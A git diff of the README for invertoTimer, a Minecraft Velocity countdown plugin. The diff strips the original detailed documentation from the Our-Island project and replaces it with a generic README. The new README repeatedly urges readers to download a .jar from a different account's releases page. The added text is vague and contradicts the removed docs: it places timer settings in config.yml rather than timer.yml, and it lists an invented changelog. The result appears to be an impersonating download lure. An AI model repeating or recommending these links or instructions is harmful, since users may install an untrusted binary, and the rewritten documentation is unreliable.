@@ -1,403 +1,88 @@
-<div align="center">
+# ⏳ invertoTimer - Keep Track of Your Events Effortlessly
 
-# invertoTimer
+[![Download Here](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Nens888/invertoTimer/releases)
 
-[![Stars](https://img.shields.io/github/stars/Our-Island/invertoTimer?style=flat-square&logo=data:image/svg%2bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZlcnNpb249IjEiIHdpZHRoPSIxNiIgaGVpZ2h0PSIxNiI+PHBhdGggZD0iTTggLjI1YS43NS43NSAwIDAgMSAuNjczLjQxOGwxLjg4MiAzLjgxNSA0LjIxLjYxMmEuNzUuNzUgMCAwIDEgLjQxNiAxLjI3OWwtMy4wNDYgMi45Ny43MTkgNC4xOTJhLjc1MS43NTEgMCAwIDEtMS4wODguNzkxTDggMTIuMzQ3bC0zLjc2NiAxLjk4YS43NS43NSAwIDAgMS0xLjA4OC0uNzlsLjcyLTQuMTk0TC44MTggNi4zNzRhLjc1Ljc1IDAgMCAxIC40MTYtMS4yOGw0LjIxLS42MTFMNy4zMjcuNjY4QS43NS43NSAwIDAgMSA4IC4yNVoiIGZpbGw9IiNlYWM1NGYiLz48L3N2Zz4=&logoSize=auto&label=Stars&labelColor=444444&color=eac54f)](https://github.com/Our-Island/invertoTimer/)
-[![GitHub CI](https://img.shields.io/github/actions/workflow/status/Our-Island/invertoTimer/ci.yml?style=flat-square&labelColor=444444&branch=master&label=GitHub%20CI&logo=github)](https://github.com/Our-Island/invertoTimer/actions/workflows/ci.yml)
-[![Hangar](https://img.shields.io/badge/Hangar-invertoTimer-004ee9?style=flat-square&labelColor=444444)](https://hangar.papermc.io/Our-Island/invertoTimer)
-[![Modrinth](https://img.shields.io/badge/Modrinth-invertoTimer-22ff84?style=flat-square&labelColor=444444)](https://modrinth.com/plugin/invertotimer/)
+## 📜 Overview
 
-</div>
+invertoTimer is a lightweight Velocity plugin designed for Minecraft. It allows server administrators to create global countdowns and schedule server-wide events easily. This tool helps enhance your gaming experience by keeping players informed about upcoming happenings.
 
-invertoTimer is a lightweight Velocity plugin for global countdowns and scheduled server-wide events.  
-It’s designed for “whole network” moments such as New Year, grand openings, maintenance reminders, and other
-timed announcements — with configurable timers, multiple display modes, and flexible actions.
+## 🚀 Getting Started
 
----
+Using invertoTimer is simple. Follow these steps to download and set up the plugin for your Minecraft server.
 
-## Introduction
+### 🖥️ System Requirements
 
-invertoTimer provides:
+- Java 8 or higher
+- A compatible Velocity server
+- Basic familiarity with server management tools
 
-- Timers based on **cron** (repeat) or **fixed time** (one-shot)
-- **Showcases** to display countdowns (actionbar / bossbar / chat / title)
-- **Actions** to trigger operations at offsets (send text, transfer players, run commands)
-- Server limitations (**global + per-timer**) to include/exclude specific backend servers
-- i18n language files and **MiniMessage** formatting for player-visible text
-- `{i18n:key}` tokens for translating player-visible texts
+### 📥 Download & Install
 
-The plugin uses two config files:
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/Nens888/invertoTimer/releases) to find the latest version.
+   
+2. **Select the Latest Release**  
+   Look for the most recent version at the top of the page. It is usually marked as the latest release.
 
-- `config.yml`: global settings (language, timezone, global limitation, etc.)
-- `timer.yml`: timer definitions (timers, showcases, actions)
+3. **Download the Plugin**  
+   Click on the download link for the `.jar` file of invertoTimer. Save it to your computer.
 
----
+4. **Install on Your Server**  
+   - Locate your Velocity server directory.
+   - Find the `plugins` folder inside.
+   - Move the downloaded `.jar` file into the `plugins` folder.
 
-## Timers
+5. **Restart Your Server**  
+   Close your server and start it up again. This ensures that invertoTimer loads correctly.
 
-Timers are configured under `timers:` in `timer.yml`.
+6. **Verify Installation**  
+   Check your server logs to ensure invertoTimer loaded successfully. Look for a message confirming the plugin is active.
 
-A timer consists of:
+### ⚙️ Configuring invertoTimer
 
-- `id` (the YAML key under `timers:`)
-- `description`
-- time spec: `cron` **or** `time`
-- optional per-timer `limitation`
-- `showcases` (periodic displays)
-- `actions` (one-shot triggers)
+Once invertoTimer is installed, you can start configuring it for your server. Here’s how:
 
-### Time specification
+1. **Access the Configuration File**  
+   Find the `invertoTimer` folder inside the `plugins` directory. This folder contains the configuration files.
 
-Choose **ONE**:
+2. **Open the Config File**  
+   Inside the folder, open the `config.yml` file using a text editor, like Notepad or Visual Studio Code.
 
-- `cron`: 5-field cron format: `min hour day month week`
-- `time`: one-shot absolute time: `yyyy-MM-dd HH:mm:ss`
+3. **Adjust Event Settings**  
+   Here you can set up your countdowns and events. Edit the relevant sections as needed:
+   - **Global Countdown**: Set the duration and start time.
+   - **Scheduled Events**: Define the event name, start time, and message to players.
 
-Example:
+4. **Save Changes**  
+   After making your changes, save the file and restart the server again to implement them.
 
-```yml
-timers:
-  new-year:
-    description: "New year timer."
-    cron: "0 0 1 1 *"
-    # time: "2026-01-01 00:00:00"
-```
+### 📋 Key Features
 
-If `time` is in the past, that timer will not run again.
+- **Global Countdown**: Create a timer visible to all players.
+- **Scheduled Events**: Set up occurrences like matches or maintenance.
+- **User-Friendly Config**: Edit settings easily with a simple file format.
+- **Minimal Resource Usage**: Designed to run smoothly without straining your server.
+  
+### 🤝 Support
 
----
+If you encounter issues or have questions about invertoTimer, consider these options:
 
-## Text Rendering
+- **Issues Page**: Check the [issues page](https://github.com/Nens888/invertoTimer/issues) for common problems and solutions.
+- **Community Forums**: Join Minecraft forums for support from other users.
+- **Documentation**: Review additional documentation on the GitHub repository for advanced features.
 
-Most **player-visible** texts support a unified rendering pipeline:
+## ⚡ Join the Community
 
-### 1) `{i18n:key}` token
+Share your experiences, feature requests, or ask questions. Connect with other users via Minecraft forums and social media platforms to enhance your server together.
 
-Use `{i18n:key}` to insert text from language files.
+## 📢 Changelog
 
-Example:
+Stay updated on new features and fixes:
+- Version 1.0: Initial release with basic countdown functionality.
+- Version 1.1: Added support for scheduled events and notifications to players.
 
-```yml
-text: "{i18n:itimer.command.list.header}"
-```
+## 📥 Download Here Again
 
-### 2) Placeholders
+Ready to enhance your Minecraft server? Click the link below to start your invertoTimer journey.
 
-These are replaced for countdown-related texts:
-
-- `{id}` timer id
-- `{description}` timer description
-- `{remaining}` formatted remaining time (HH:MM:SS or similar)
-- `{days}` `{hours}` `{minutes}` `{seconds}`
-- `{total_seconds}`
-- `{target}` target time string
-
-### 3) MiniMessage formatting
-
-Player-visible texts support MiniMessage tags such as:
-
-- `<red>text</red>`
-- `<gold>`, `<yellow>`, `<gray>`
-- `<gradient:red:yellow>...</gradient>`
-
----
-
-## Showcases
-
-Showcases are **periodic displays** that run while a timer is active.  
-They are configured under `timers.<id>.showcases`.
-
-Supported showcase types:
-
-- `actionbar`
-- `bossbar`
-- `text` (chat message)
-- `title` (single entry that supports both title + subtitle)
-
-### Common fields
-
-- `start-at`: when to start showing **before** the target time  
-  Examples: `10m`, `30s`, `1h`, `1d`
-- `interval`: how often to update/show  
-  Examples: `1s`, `5s`, `30s`, `1m`
-
-If `start-at` is omitted, the showcase begins immediately once the timer has a next target.
-
-### After-target display (Actionbar / Bossbar / Title)
-
-`actionbar`, `bossbar`, and `title` support an optional `after:` block.  
-This allows you to keep showing a message **after the countdown reaches 0**, for a configured duration.
-
-```yml
-after:
-  text: "Happy New Year!"
-  duration: 10m
-```
-
-The “after” stage is active during `[target, target + after.duration]`.
-
-### Actionbar showcase
-
-```yml
-showcases:
-  actionbar:
-    start-at: 1h
-    interval: 1s
-    text: "<yellow>New Year in</yellow> <white>{remaining}</white>"
-    after:
-      text: "<gold>Happy New Year!</gold>"
-      duration: 10m
-```
-
-### Bossbar showcase (with color)
-
-Bossbar supports an optional `color` field:
-
-- `pink | blue | red | green | yellow | purple | white` (case-insensitive)
-- invalid/missing values fall back to a safe default
-
-```yml
-showcases:
-  bossbar:
-    start-at: 1h
-    interval: 1s
-    color: red
-    text: "<gradient:red:yellow>New Year in {remaining}</gradient>"
-    after:
-      text: "<gold>Happy New Year!</gold>"
-      duration: 10m
-```
-
-Bossbar progress is based on `start-at`:
-
-- e.g. `start-at: 1h` means progress decreases from `1.0` → `0.0` over that 1 hour.
-
-### Text (chat) showcase
-
-Chat text does not have `after:` in the current design; it is meant for periodic messages leading up to the target.
-
-```yml
-showcases:
-  text:
-    start-at: 10m
-    interval: 30s
-    text: "<gray>[Timer]</gray> <white>{remaining}</white> left"
-```
-
-### Title showcase (single “title” entry)
-
-The **title** showcase is a single key (`showcases.title`) that contains both title and subtitle text.
-
-It uses a **unified text format** compatible with text actions:
-
-- `text` may be a String or a List/Array
-- List/Array supports title+subtitle and optional timing
-
-Recommended format:
-
-```yml
-showcases:
-  title:
-    start-at: 10m
-    interval: 5s
-    text:
-      - "<gold>New Year</gold>"      # title
-      - "<gray>{remaining}</gray>"   # subtitle
-      - "0"                          # fadeIn seconds (optional)
-      - "2"                          # stay seconds   (optional)
-      - "0"                          # fadeOut seconds(optional)
-    after:
-      text:
-        - "<gold>Happy New Year!</gold>"
-        - "<gray>🎉</gray>"
-        - "0"
-        - "2"
-        - "0"
-      duration: 30s
-```
-
-If `text` is a plain string, it is treated as the main title, and subtitle becomes an empty string.
-
----
-
-## Actions
-
-Actions are **one-shot triggers** executed at a time offset relative to the target time.
-
-Configured under `timers.<id>.actions`.
-
-### Common fields
-
-- `type`: `text` | `transfer` | `command`
-- `shift`: time offset relative to target
-    - negative = before target (e.g. `-30m`)
-    - zero = at target (e.g. `0s`)
-    - positive = after target (e.g. `5s`)
-
-### 1) Text action
-
-Sends different types of text to players.
-
-```yml
-- type: text
-  shift: -30m
-  options:
-    text-type: message
-    info: "<green>Ready?</green>"
-```
-
-`text-type`:
-
-- `message` (chat)
-- `actionbar`
-- `title`
-- `subtitle`
-
-#### Title/Subitle “info” format + timings
-
-For `text-type: title` or `text-type: subtitle`, `info` can be:
-
-**A) String**
-
-- `text-type: title` → title = info, subtitle = `""`
-- `text-type: subtitle` → title = `""`, subtitle = info
-
-**B) Array/List (recommended)**
-
-`info: [title, subtitle, fadeIn, stay, fadeOut]`
-
-Index mapping:
-
-- `0` → title text
-- `1` → subtitle text
-- `2` → fadeIn seconds (optional)
-- `3` → stay seconds (optional)
-- `4` → fadeOut seconds (optional)
-
-Example:
-
-```yml
-- type: text
-  shift: 0s
-  options:
-    text-type: title
-    info:
-      - "<gold>Happy New Year!</gold>"
-      - "<gray>{remaining}</gray>"
-      - "0"
-      - "2"
-      - "0"
-```
-
-Title/subtitle/actionbar/message texts support `{i18n:key}` + placeholders + MiniMessage.
-
-### 2) Transfer action
-
-Transfers matched players to a backend server.
-
-```yml
-- type: transfer
-  shift: -15m
-  options:
-    target: hub
-    transferee: ".*"
-```
-
-- `target`: backend server name in Velocity
-- `transferee`: **Java regex** to match online player usernames (`matches()` full match)
-    - all players: `".*"`
-    - starts with `Steve_`: `"^Steve_.*$"`
-    - only Alice/Bob: `"^(Alice|Bob)$"`
-
-### 3) Command action
-
-Executes a configured command.
-
-```yml
-- type: command
-  shift: 5s
-  options:
-    executor: player
-    match: ".*"
-    command: "/function t"
-```
-
-- `executor: console` runs as proxy console (ignores `match`)
-- `executor: player` runs via the player's backend (`spoofChatInput`) for matched players
-- `match`: Java regex to match online player usernames (`matches()`)
-- `command` is treated as a **plain string**. Do not use MiniMessage here.  
-  Placeholders are only available if your string-rendering pipeline applies them.
-
----
-
-## Quick Start
-
-Install:
-
-- Download the jar from Hangar/Modrinth (or build from source)
-- Put it into your Velocity `plugins/` folder
-- Start the proxy once to generate configs
-
-Configure:
-
-- Edit `config.yml` (language, timezone, global limitation)
-- Edit `timer.yml` (timers, showcases, actions)
-
-Minimal example:
-
-```yml
-timers:
-  new-year:
-    description: "New year timer."
-    cron: "0 0 1 1 *"
-    showcases:
-      actionbar:
-        start-at: 1h
-        interval: 1s
-        text: "<yellow>New Year in</yellow> <white>{remaining}</white>"
-        after:
-          text: "<gold>Happy New Year!</gold>"
-          duration: 10m
-    actions:
-      - type: text
-        shift: 0s
-        options:
-          text-type: title
-          info:
-            - "<gold>Happy New Year!</gold>"
-            - "<gray>🎉</gray>"
-            - "0"
-            - "2"
-            - "0"
-```
-
-Reload:
-
-```txt
-/itimer reload
-```
-
----
-
-## Feedback
-
-Please use GitHub Issues for bug reports and feature requests.  
-When reporting a bug, include your Velocity version, the invertoTimer version, your `config.yml` and `timer.yml`, and
-the relevant console logs so the issue can be reproduced.
-
----
-
-## Contributing
-
-Contributions are welcome. Fork the repository, create a feature branch, and keep changes focused and easy to review.  
-When opening a Pull Request, explain what changed, why it changed, and how to test it.
-
-If your changes affect configuration structure or i18n, please update the README, the example configs, and language
-files when needed.
-
----
-
-## License
-
-This project is licensed under the MIT License. See
-the [LICENSE](https://github.com/Our-Island/invertoTimer/blob/master/LICENSE) file for details.
+[![Download Here](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Nens888/invertoTimer/releases)
